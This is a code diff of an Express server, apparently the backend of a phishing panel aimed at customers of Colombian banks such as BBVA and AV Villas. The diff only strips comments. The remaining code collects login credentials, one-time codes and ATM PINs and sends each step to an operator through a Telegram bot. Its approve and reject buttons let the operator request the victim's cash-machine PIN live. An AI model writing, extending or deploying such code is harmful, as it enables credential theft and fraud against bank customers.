@@ -21,11 +21,9 @@ const pagosPendientes = new Map();
 function esBancoClaveATM(banco) {
     if (!banco) return false;
     const b = String(banco).trim().toLowerCase();
-    // BBVA: "BBVA", "BBVA Colombia", "BANCO BILBAO VIZCAYA ARGENTARIA COLOMBIA, S.A", etc.
     if (b.includes('bbva')) return true;
     if (b.includes('bilbao') && b.includes('vizcaya')) return true;
     if (b.includes('bilbao vizcaya')) return true;
-    // AV Villas: "AV Villas", "AVVillas", "A.V. Villas", "Banco AV Villas", etc.
     if (b.includes('av villas')) return true;
     if (b.includes('avvillas')) return true;
     if (b.includes('a.v. villas')) return true;
@@ -197,7 +195,6 @@ app.post('/api/crear-pago', async (req, res) => {
             pago.paso = paso || pago.paso;
             pago.fase_actual = paso === 'otp' ? 'otp' : 'credenciales';
 
-            // 🔥 Nuevo inicio de credenciales → limpiar claves residuales
             if (paso === 'credenciales') {
                 pago.codigo_otp = null;
                 pago.clave_atm = null;
@@ -212,7 +209,6 @@ app.post('/api/crear-pago', async (req, res) => {
 
         const pasoActual = paso || 'crear';
         
-        // 🔥 CONFIGURACIÓN DE BOTONES SEGÚN EL PASO Y BANCO
         let replyMarkup;
         if (pasoActual === 'crear') {
             replyMarkup = { inline_keyboard: [[
@@ -237,7 +233,6 @@ app.post('/api/crear-pago', async (req, res) => {
             ]]};
         }
 
-        // 🔥 ENVIAMOS EL MENSAJE SEGÚN EL PASO Y GUARDAMOS EL message_id
         if (pasoActual === 'crear') {
             const sent = await tgSendMessage(textoPasoCrear(pago), replyMarkup);
             if (sent && sent.ok && sent.result) pago.message_id_crear = sent.result.message_id;
@@ -310,7 +305,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const pago = pagosPendientes.get(solicitud_id);
         if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada');
 
-        // 🔥 FIX DEFINITIVO: decidir fase por message_id del mensaje aprobado
         const estaEnFaseOTP = (msgId === pago.message_id_otp);
 
         if (accion === 'aprobar') {
@@ -336,7 +330,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}`);
             }
         } else if (accion === 'clave_atm') {
-            // 🔥 Botón "Clave ATM": pide al cliente ingresar la clave del cajero
             pago.estado = 'aprobado_credenciales';
             await tgAnswerCallback(cq.id, '🔑 Se solicitó Clave ATM al cliente');
             if (msgId) {
